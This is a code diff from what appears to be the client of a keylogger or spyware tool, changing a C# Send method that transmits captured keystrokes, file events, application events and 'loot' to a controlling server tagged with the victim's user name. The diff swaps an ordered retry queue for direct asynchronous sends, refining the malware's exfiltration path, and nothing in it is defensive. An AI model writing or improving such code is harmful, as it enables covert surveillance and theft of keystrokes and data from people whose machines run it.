@@ -15,41 +15,24 @@ namespace Client.Communication
         {
             Keylog, FileEvent, ApplicationEvent, Loot
         }
-        private static List<Tuple<string, StringType>> _sdata = new List<Tuple<string, StringType>>();
         public static async Task Send(string sdata, StringType type)
         {
-            var data = new Tuple<string, StringType>(sdata, type);
-            _sdata.Add(data);
-            await Task.Run(() =>
+            await Task.Run(async () =>
             {
-                bool failed = false;
-                /// Make sure they are sent in order.
-                foreach (var i in _sdata.ToList())
+                switch (type)
                 {
-                    switch (i.Item2)
-                    {
-                        case StringType.Keylog:
-                            if (Server.AsyncSendString(i.Item1, Environment.UserName, "logs").Result)
-                                _sdata.Remove(i);
-                            else failed = true;
-                            break;
-                        case StringType.FileEvent:
-                            if (Server.AsyncSendString(i.Item1, Environment.UserName, "fileevent").Result)
-                                _sdata.Remove(i);
-                            else failed = true;
-                            break;
-                        case StringType.ApplicationEvent:
-                            if (Server.AsyncSendString(i.Item1, Environment.UserName, "applicationevent").Result)
-                                _sdata.Remove(i);
-                            else failed = true;
-                            break;
-                        case StringType.Loot:
-                            if (Server.AsyncSendString(i.Item1, Environment.UserName, "loot").Result)
-                                _sdata.Remove(i);
-                            else failed = true;
-                            break;
-                    }
-                    if (failed) break;
+                    case StringType.Keylog:
+                        await Server.AsyncSendString(sdata, Client.Utilities.User_Info.GetUserName(), "logs");
+                        break;
+                    case StringType.FileEvent:
+                        await Server.AsyncSendString(sdata, Client.Utilities.User_Info.GetUserName(), "fileevent");
+                        break;
+                    case StringType.ApplicationEvent:
+                        await Server.AsyncSendString(sdata, Client.Utilities.User_Info.GetUserName(), "applicationevent");
+                        break;
+                    case StringType.Loot:
+                        await Server.AsyncSendString(sdata, Client.Utilities.User_Info.GetUserName(), "loot");
+                        break;
                 }
             });
         }
